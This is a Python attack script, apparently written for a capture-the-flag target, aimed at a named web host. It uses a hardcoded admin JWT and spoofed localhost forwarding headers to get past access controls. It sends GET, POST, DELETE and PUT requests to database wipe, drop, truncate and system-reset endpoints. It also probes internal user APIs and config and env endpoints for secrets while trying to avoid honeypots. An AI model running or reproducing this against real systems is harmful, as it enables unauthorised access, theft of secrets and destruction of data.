#!/usr/bin/env python3
"""
Find REAL backend database - avoid honeypots
Look for actual database management endpoints
"""

import requests
import json

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

print("="*70)
print("FINDING REAL DATABASE BACKEND")
print("="*70)

# Look for actual database management endpoints
backend_endpoints = [
    # Database admin
    '/api/admin/database/wipe',
    '/api/admin/database/clear',
    '/api/admin/database/reset',
    '/api/admin/database/drop',
    '/api/admin/database/truncate',
    '/api/admin/db/wipe',
    '/api/admin/db/clear',
    '/api/admin/db/reset',
    
    # System admin
    '/api/admin/system/reset',
    '/api/admin/system/wipe',
    '/api/system/reset',
    '/api/system/wipe',
    
    # Maintenance
    '/api/admin/maintenance',
    '/api/admin/maintenance/clear',
    '/api/maintenance',
    '/api/maintenance/clear',
    
    # Backend
    '/api/backend',
    '/api/backend/reset',
    '/api/admin/backend',
    '/api/admin/backend/reset',
    
    # Storage
    '/api/storage',
    '/api/storage/clear',
    '/api/admin/storage',
    '/api/admin/storage/clear',
    
    # Cache (might reveal real endpoints)
    '/api/cache',
    '/api/cache/clear',
    '/api/admin/cache',
    '/api/admin/cache/clear',
]

print("\n[1] Testing backend endpoints...")
for endpoint in backend_endpoints:
    for method in ['GET', 'POST', 'DELETE', 'PUT']:
        try:
            if method == 'GET':
                resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
            elif method == 'POST':
                resp = requests.post(f"{base_url}{endpoint}", headers=headers, json={}, timeout=5)
            elif method == 'DELETE':
                resp = requests.delete(f"{base_url}{endpoint}", headers=headers, timeout=5)
            elif method == 'PUT':
                resp = requests.put(f"{base_url}{endpoint}", headers=headers, json={}, timeout=5)
            
            if resp.status_code not in [404, 405]:
                print(f"[+] {method} {endpoint} - {resp.status_code}")
                print(f"    {resp.text[:200]}")
                
                # Check for flag
                if 'flag{' in resp.text.lower() or 'ethara{' in resp.text.lower():
                    print(f"    [!!!] FLAG FOUND!")
                    print(f"    {resp.text}")
        except:
            pass

# Check for GraphQL/alternative APIs
print("\n[2] Checking alternative APIs...")
alt_apis = [
    '/graphql',
    '/api/graphql',
    '/api/v1/users',
    '/api/v2/users',
    '/v1/users',
    '/v2/users',
    '/api/internal/users',
    '/internal/users',
    '/api/private/users',
    '/private/users',
]

for endpoint in alt_apis:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"[+] Found: {endpoint}")
            try:
                data = resp.json()
                if isinstance(data, list):
                    print(f"    {len(data)} items")
            except:
                print(f"    {resp.text[:100]}")
    except:
        pass

# Check for database type indicators
print("\n[3] Checking database type...")
db_check_endpoints = [
    '/api/admin/config',
    '/api/config',
    '/api/admin/settings',
    '/api/settings',
    '/api/admin/env',
    '/api/env',
]

for endpoint in db_check_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"[+] {endpoint}")
            print(f"    {resp.text[:300]}")
    except:
        pass

print("\n" + "="*70)
